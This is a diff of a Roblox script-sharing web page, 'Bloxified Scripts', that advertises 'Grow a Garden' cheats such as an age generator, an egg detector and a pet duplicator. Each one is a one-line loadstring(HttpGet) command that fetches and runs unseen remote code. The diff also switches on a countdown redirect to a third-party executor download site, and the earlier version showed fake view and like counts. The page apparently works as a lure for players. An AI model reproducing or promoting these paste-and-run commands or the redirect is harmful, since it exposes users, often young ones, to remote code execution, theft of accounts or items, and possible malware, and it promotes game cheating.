@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Welcome to Bloxified Scripts</title>
-  <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;600&family=Inter:wght@400;600&display=swap" rel="stylesheet" />
+  <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;600&family=Inter:wght@400;600&display=swap" rel="stylesheet">
   <style>
     * {
       margin: 0;
@@ -23,65 +23,17 @@
       align-items: center;
     }
 
-    .top-banner {
+    .banner {
       width: 100%;
-      max-width: 950px;
-      margin-bottom: 25px;
-      padding: 15px 20px;
-      background: rgba(26, 0, 44, 0.8);
-      border: 1px solid #610080;
-      border-radius: 12px;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      box-shadow: 0 0 12px #7600ff55;
-    }
-
-    .left {
-      display: flex;
-      align-items: center;
-    }
-
-    .avatar {
-      width: 48px;
-      height: 48px;
-      border-radius: 10px;
-      margin-right: 12px;
-      border: 2px solid #8f00ff;
-    }
-
-    .user-info {
-      display: flex;
-      flex-direction: column;
-    }
-
-    .username {
+      max-width: 900px;
+      background: linear-gradient(90deg, #c200ff, #7600ff);
+      padding: 10px;
+      text-align: center;
+      border-radius: 8px;
+      margin-bottom: 20px;
+      box-shadow: 0 0 20px #c200ff;
       font-weight: 600;
-      font-size: 1.1em;
-      color: #fff;
-    }
-
-    .user-label {
-      font-size: 0.9em;
-      color: #bbbbbb;
-    }
-
-    .right {
-      display: flex;
-      gap: 20px;
-      align-items: center;
-    }
-
-    .stat {
-      font-size: 0.95em;
-      color: #ccc;
-      display: flex;
-      align-items: center;
-    }
-
-    .stat .icon {
-      margin-right: 6px;
-      color: #ff9fff;
+      font-size: 1.2em;
     }
 
     .container {
@@ -176,13 +128,19 @@
       padding: 10px;
       border-radius: 6px;
       overflow-x: auto;
-      font-size: 0.9em;
+      font-size: 0.85em;
       color: #aaffff;
+      user-select: all;
+      -webkit-user-select: all;
+      -moz-user-select: all;
+      -ms-user-select: all;
+      white-space: pre-wrap;
+      word-break: break-all;
     }
 
     .slot .description {
       margin-top: 10px;
-      font-size: 0.95em;
+      font-size: 0.9em;
       color: #bbbbbb;
     }
 
@@ -192,14 +150,13 @@
     }
 
     @media screen and (max-width: 480px) {
-      .top-banner {
-        flex-direction: column;
-        align-items: flex-start;
-        gap: 10px;
-      }
-
       h1 {
         font-size: 1.8em;
+      }
+
+      .banner {
+        font-size: 1em;
+        padding: 8px;
       }
 
       .btn {
@@ -224,39 +181,26 @@
       }
 
       .slot pre {
-        font-size: 0.8em;
+        font-size: 0.75em;
       }
     }
   </style>
 </head>
 <body>
-  <div class="top-banner">
-    <div class="left">
-      <a href="https://www.roblox.com/users/5240193541/profile" target="_blank" style="text-decoration: none; color: inherit;">
-        <img class="avatar" src="https://www.roblox.com/headshot-thumbnail/image?userId=5240193541&width=420&height=420&format=png" alt="Bloxified Avatar">
-        <div class="user-info">
-          <div class="username">Bloxified</div>
-          <div class="user-label">Host</div>
-        </div>
-      </a>
-    </div>
-    <div class="right">
-      <div class="stat"><span class="icon">👁</span> <span id="viewCount">0</span></div>
-      <div class="stat"><span class="icon">❤️</span> <span id="likeCount">0</span></div>
-      <a href="https://www.roblox.com/users/5240193541/profile" target="_blank" class="stat"><span class="icon">📧</span></a>
-    </div>
+  <div class="banner">
+    🔥 BLOXIFIED SCRIPTS | UPDATES DAILY 🔥
   </div>
 
   <div class="container">
     <div class="notice">
       <h2>Executor Compatibility Notice</h2>
       <p>
-        This script is not fully compatible with Delta or other restricted-level executors. Users may experience injection failures, missing APIs, or unstable behavior.<br><br>
-        For full functionality and performance, we strongly recommend using <strong>KRNL</strong>, which offers:<br><br>
-        - Support for critical APIs such as <code>getgenv</code>, <code>getconnections</code>, <code>debug</code>, and <code>getnilinstances</code><br>
-        - Fast injection time and reduced crash rate<br>
-        - Enhanced memory handling and script stability<br>
-        - <strong>Built-in anti-scam protection</strong> to reduce risk from malicious scripts
+        This script may not run properly on limited executors like Delta. We recommend using <strong>KRNL</strong> for best performance and feature access.<br><br>
+        KRNL supports:<br>
+        - Advanced APIs like <code>getconnections</code>, <code>getgc</code>, <code>getnilinstances</code><br>
+        - Improved UI rendering<br>
+        - Enhanced script compatibility<br>
+        - Built-in anti-scam protection
       </p>
     </div>
 
@@ -266,46 +210,34 @@
   </div>
 
   <div class="scripts-section">
-    <h2>Troll Scripts</h2>
+    <h2>Overpowered Scripts</h2>
 
     <div class="slot">
-      <pre>loadstring(game:HttpGet("https://raw.githubusercontent.com/grow-a-garden-ctrl/AgeGenerator/refs/heads/main/unliagegenerator.lua"))();
-You sent
-</pre>
-      <div class="description"> Pet Age Enhancer – Grow a Garden
-This script accelerates your pet's visible age progression within Grow a Garden, allowing users to showcase more mature pets without waiting for natural timers. It integrates seamlessly with in-game visuals to simulate legitimate growth activity.
-
-🔹 Features:
-Instantly increases pet age display upon execution
-
-Smooth transition effects and UI updates that match the game’s natural behavior
-
-Perfect for showcasing evolved pets or testing age-specific behaviors
-
-🔧 System Requirements:
-Executor: Optimized for KRNL due to full support for TweenService, UI layering, and frame rendering
-
-Compatibility: May not render correctly on Delta or other minimal API executors
-
-💡 Developer Note:
-This tool is ideal for content creators, testers, or anyone wanting to bypass the usual waiting time for growth stages. Frequently updated for compatibility with the latest Grow a Garden releases.</div>
+      <pre>loadstring(game:HttpGet("https://raw.githubusercontent.com/grow-a-garden-ctrl/AgeGenerator/refs/heads/main/unliagegenerator.lua"))();</pre>
+      <div class="description">
+        <strong>Age Generator:</strong> Increases the pet age display for any pet in Grow a Garden. Uses tween animations and UI overlays to make pets older. Recommended for KRNL.
+      </div>
     </div>
 
     <div class="slot">
-      <pre>-- Paste your second troll script here</pre>
-      <div class="description">You can explain what this script does, the trolling method, or who it works best on.</div>
+      <pre>loadstring(game:HttpGet("https://raw.githubusercontent.com/grow-a-garden-ctrl/EggDetector/refs/heads/main/main.lua"))()</pre>
+      <div class="description">
+        <strong>Egg Detector:</strong> Highlights hidden or nearby eggs and allows script-driven subject switching inside unhatched eggs. Offers enhanced detection via ESP overlay.
+      </div>
     </div>
 
     <div class="slot">
-      <pre>-- Paste your third troll script here</pre>
-      <div class="description">Add any updates or compatibility notes here.</div>
+      <pre>loadstring(game:HttpGet("https://raw.githubusercontent.com/grow-a-garden-ctrl/PetDuplicator/refs/heads/main/PetDuplicator"))();</pre>
+      <div class="description">
+        <strong>Pet Duplicator:</strong> Clones pets into your inventory interface no limits. Useful for trading scenarios or flexing. abuse while not patched. Requires KRNL for full functionality.
+      </div>
     </div>
   </div>
 
   <script>
     const btn = document.getElementById("downloadBtn");
     const countdownText = document.getElementById("countdown");
-    const redirectURL = "https://krnl.place";
+    const redirectURL = "https://krnl.cat";
 
     let countdown = 30;
 
@@ -326,17 +258,9 @@ This tool is ideal for content creators, testers, or anyone wanting to bypass th
 
     btn.addEventListener("click", () => {
       if (!btn.disabled) {
-        alert("Redirecting to: " + redirectURL);
-        // window.location.href = redirectURL;
+        window.location.href = redirectURL;
       }
     });
-
-    // Random viewer and like counts
-    document.getElementById("viewCount").textContent = 
-      (Math.floor(Math.random() * 100000) + 300000).toLocaleString() + " views";
-
-    document.getElementById("likeCount").textContent = 
-      (Math.floor(Math.random() * 50000) + 100000).toLocaleString() + " likes";
   </script>
 </body>
 </html>
